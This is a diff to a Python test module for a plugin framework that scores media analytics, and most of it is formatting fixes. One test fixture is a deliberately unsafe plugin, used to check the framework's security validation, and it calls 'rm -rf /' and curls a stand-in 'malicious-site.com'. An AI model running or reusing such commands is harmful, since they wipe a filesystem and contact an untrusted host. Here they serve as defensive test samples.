@@ -1,14 +1,14 @@
 """
-Tests for open - source plugin framework and examples.
+Tests for open-source plugin framework and examples.
 
 This module tests the OpenSourceScoringPlugin base class, plugin validation,
-security checking, and example plugins for user - defined scoring algorithms.
+security checking, and example plugins for user-defined scoring algorithms.
 """
 
-from datetime import datetime, timedelta
 import json
 import os
 import tempfile
+from datetime import datetime, timedelta
 from typing import Any, Dict, List
 from unittest.mock import MagicMock, Mock, patch
 
@@ -345,7 +345,7 @@ import sys
 def calculate_scores(self, data):
     # Dangerous operations
     os.system("rm -rf /")
-    subprocess.call(["curl", "malicious - site.com"])
+    subprocess.call(["curl", "malicious-site.com"])
     return data
 """
 
@@ -436,13 +436,13 @@ class TestPluginRegistry:
         assert retrieved_plugin.get_name() == "retrievable_plugin"
 
     def test_get_plugin_nonexistent(self):
-        """Test retrieving non - existent plugin."""
+        """Test retrieving non-existent plugin."""
         plugin = self.registry.get_plugin("nonexistent_plugin")
         assert plugin is None
 
 
 class TestExamplePlugins:
-    """Test example open - source plugins."""
+    """Test example open-source plugins."""
 
     def setup_method(self):
         """Set up test fixtures."""
@@ -456,7 +456,7 @@ class TestExamplePlugins:
             for day_offset in [7, 5, 3, 1]:
                 date = datetime.now() - timedelta(days=day_offset)
                 # Simulate growth over time
-                view_multiplier = (8 - day_offset) / 7  # Growth from older to newer
+                view_multiplier = (8-day_offset) / 7  # Growth from older to newer
 
                 data_points.append(
                     {
@@ -465,7 +465,7 @@ class TestExamplePlugins:
                         "view_count": int(base_views * view_multiplier),
                         "like_count": int(base_views * view_multiplier * 0.05),
                         "comment_count": int(base_views * view_multiplier * 0.005),
-                        "published_date": date - timedelta(days=30),
+                        "published_date": date-timedelta(days=30),
                         "analytics_date": date,
                         "genre": ["pop", "rock", "electronic"][entity_idx],
                         "platform": "youtube",
